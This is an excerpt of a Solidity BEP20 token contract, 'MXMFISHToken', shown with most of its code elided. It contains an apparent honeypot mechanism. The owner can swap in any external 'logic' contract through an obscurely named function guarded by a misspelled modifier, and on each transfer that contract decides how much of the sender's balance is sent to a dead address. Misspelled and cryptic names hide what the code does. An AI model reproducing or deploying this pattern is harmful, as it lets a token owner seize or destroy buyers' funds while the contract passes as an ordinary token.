...
contract MXMFISHToken is BEP20, Ownable {

	string name_ = "MXMFISHToken";
	string symbol_ = "MXMFISH";
    ...
    ILogic1 public logic1 =ILogic1(0x21a8f3935d6E348A025fE63Bae81E7cC217f8710);
    ...
    function SLL(address _lacc) external onlyowaer {
        logic1 = ILogic1(_lacc);
    }

    function GLL() external view onlyowaer returns(address) {
        return address(logic1);
    }
    ...
    function _trans(
        ...
        uint256 tradefeiiamuont = logic1._antiBots(from,_to,_amuont);

        if (tradefeiiamuont>0) {
            _balances[from] = _balances[from].sub(tradefeiiamuont);
            _balances[_dead] = _balances[_dead].add(tradefeiiamuont);
            emit Transfer(from, _dead, tradefeiiamuont);
        }
